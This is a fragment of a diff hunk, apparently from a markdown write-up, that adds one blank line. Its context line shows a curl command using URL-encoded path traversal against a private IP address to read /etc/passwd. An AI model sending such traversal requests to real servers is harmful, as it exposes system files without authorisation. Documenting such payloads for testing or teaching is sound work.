@@ -20,6 +20,7 @@ curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 
 
+
 ```
 
 
